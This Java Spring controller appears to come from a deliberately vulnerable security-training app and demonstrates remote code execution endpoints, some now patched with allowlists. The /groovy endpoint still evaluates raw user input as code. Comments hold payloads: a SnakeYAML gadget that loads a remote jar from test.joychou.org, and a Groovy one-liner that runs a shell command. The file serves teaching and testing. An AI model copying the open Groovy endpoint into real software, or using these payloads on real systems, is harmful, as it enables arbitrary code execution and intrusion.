package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.List;
import java.util.Set;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    // Allowlist of commands permitted for the ProcessBuilder endpoint
    private static final Set<String> ALLOWED_COMMANDS = Set.of(
            "whoami", "id", "hostname", "date", "uptime", "uname", "df", "free", "ps"
    );

    // Allowlist of hosts permitted for the JS script loading endpoint
    private static final Set<String> ALLOWED_SCRIPT_HOSTS = Set.of(
            "trusted.example.com"
    );

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        StringBuilder sb = new StringBuilder();

        try {
            // Parse user input into tokens; validate command against allowlist
            String[] tokens = cmd.trim().split("\\s+");
            String command = tokens[0];

            if (!ALLOWED_COMMANDS.contains(command)) {
                return "Command not allowed. Permitted commands: " + ALLOWED_COMMANDS;
            }

            // Use ProcessBuilder with argv array (no shell) to prevent injection
            List<String> cmdList = Arrays.asList(tokens);
            ProcessBuilder processBuilder = new ProcessBuilder(cmdList);
            processBuilder.redirectErrorStream(true);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        try {
            // Parse user input into tokens; validate command against allowlist
            String[] tokens = cmd.trim().split("\\s+");
            String command = tokens[0];

            if (!ALLOWED_COMMANDS.contains(command)) {
                return "Command not allowed. Permitted commands: " + ALLOWED_COMMANDS;
            }

            // Build argument list without a shell; no shell interpolation
            List<String> cmdList = Arrays.asList(tokens);
            ProcessBuilder processBuilder = new ProcessBuilder(cmdList);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://trusted.example.com/zz.js
     *
     * @param jsurl js url (must be HTTPS from an allowlisted host)
     */
    @GetMapping("/jscmd")
    public String jsEngine(String jsurl) throws Exception {
        // Validate the URL: require HTTPS and an allowlisted host
        URL parsedUrl;
        try {
            parsedUrl = new URL(jsurl);
        } catch (MalformedURLException e) {
            return "Invalid URL";
        }

        if (!"https".equalsIgnoreCase(parsedUrl.getProtocol())) {
            return "Only HTTPS URLs are permitted";
        }

        if (!ALLOWED_SCRIPT_HOSTS.contains(parsedUrl.getHost().toLowerCase())) {
            return "Host not in allowlist. Permitted hosts: " + ALLOWED_SCRIPT_HOSTS;
        }

        // Reject path traversal and fragments that could alter semantics
        String path = parsedUrl.getPath();
        if (path.contains("..") || path.contains("\\")) {
            return "Invalid URL path";
        }

        // Create engine with Java class access disabled (--no-java)
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        bindings.remove("Java");
        bindings.remove("Packages");
        bindings.remove("java");
        bindings.remove("javax");
        bindings.remove("javafx");
        bindings.remove("com");
        bindings.remove("org");
        bindings.remove("edu");

        String cmd = String.format("load(\"%s\")", parsedUrl.toExternalForm());
        engine.eval(cmd, bindings);
        return "Script executed successfully";
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        GroovyShell groovyShell = new GroovyShell();
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) throws Exception{
        // Use ProcessBuilder with absolute path and argv array (no shell)
        new ProcessBuilder("/usr/bin/touch", "/tmp/x").start();
    }
}

